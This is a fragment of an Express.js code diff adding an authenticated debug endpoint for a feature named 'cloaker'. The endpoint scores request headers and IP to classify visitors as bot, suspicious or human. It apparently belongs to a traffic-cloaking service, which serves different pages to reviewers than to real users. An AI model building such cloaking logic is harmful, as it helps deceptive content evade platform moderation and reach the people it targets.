+    res.status(500).send('Erro no redirecionamento')
+  }
+})
+
+// Test fingerprint (for debugging)
+app.post('/api/cloaker/fingerprint', authMiddleware, async (req, res) => {
+  const blocked = checkFeature(req, res, 'cloaker')
+  if (blocked) return blocked
+  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '0.0.0.0'
+  const headers = { 'user-agent': req.headers['user-agent'] || '', 'accept-language': req.headers['accept-language'] || '', referer: req.headers['referer'] || '', via: req.headers['via'] || '', 'x-forwarded-for': req.headers['x-forwarded-for'] || '' }
+  const score = calculateFraudScore(headers, ip, { country: req.headers['cf-ipcountry'] || '' })
+  res.json({
+    fraudScore: score,
+    risk: score >= 70 ? 'bot' : score >= 40 ? 'suspicious' : 'human',
+    headers: {
+      ua: headers['user-agent'].slice(0, 120),
+      acceptLanguage: headers['accept-language'],
+      referer: headers['referer'] || '(none)',
+    }
+  })
+})
+
 app.get('/api/user/profile', authMiddleware, (req, res) => {
   res.json({ user: req.user })
 })
